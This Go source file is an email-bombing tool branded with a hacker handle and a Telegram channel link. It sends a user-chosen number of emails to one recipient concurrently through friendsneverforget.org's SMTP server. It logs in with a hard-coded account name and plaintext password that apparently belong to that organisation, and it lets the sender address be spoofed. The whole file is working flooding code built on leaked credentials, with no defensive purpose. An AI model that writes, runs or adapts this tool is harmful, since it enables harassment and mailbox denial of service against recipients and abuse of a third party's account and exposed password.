package main

import (
    "fmt"
    "net/smtp"
    "sync"
)

func sendEmail(auth smtp.Auth, from string, to string, subject string, msg []byte, wg *sync.WaitGroup) {
    defer wg.Done()
    msg = []byte("Subject: " + subject + "\n\n" + string(msg))
    err := smtp.SendMail("friendsneverforget.org:587", auth, from, []string{to}, msg)
    if err != nil {
        fmt.Println("Error: server problem please try again later")
    } else {
        fmt.Println("Email sent successfull")
    }
}

func main() {

    auth := smtp.PlainAuth("", "info@friendsneverforget.org", "Navywife1199!!", "friendsneverforget.org")

    // banner                                                                        logo := `
____ ____    ____ _  _ ____ _ _
| __ |  |    |___ |\/| |__| | |
|__] |__|    |___ |  | |  | | |___[0xNaHiD]`
    fmt.Println(logo)
    fmt.Println("\033[34m---------------------------------------------------")
    fmt.Println("   \033[36mTelegram : \033[35mhttps://t.me/EHCommunityOfficial")
    fmt.Println("\033[34m---------------------------------------------------")

    var from string
    fmt.Print("\033[33mEnter sender email address:\033[37m ")
    fmt.Scan(&from)


    var to string
    fmt.Print("\033[33mEnter recipient email address:\033[37m ")
    fmt.Scan(&to)


    var subject string
    fmt.Print("\033[33mEnter subject of the email:\033[37m ")
    fmt.Scan(&subject)


    var message string
    fmt.Print("\033[33mEnter message to send:\033[37m ")
    fmt.Scan(&message)


    var count int
    fmt.Print("\033[33mEnter number of emails to send:\033[37m ")
    fmt.Scan(&count)

    var wg sync.WaitGroup
    for i := 1; i <= count; i++ {
        wg.Add(1)
        go sendEmail(auth, from, to, subject, []byte(message), &wg)
    }
    wg.Wait()
}
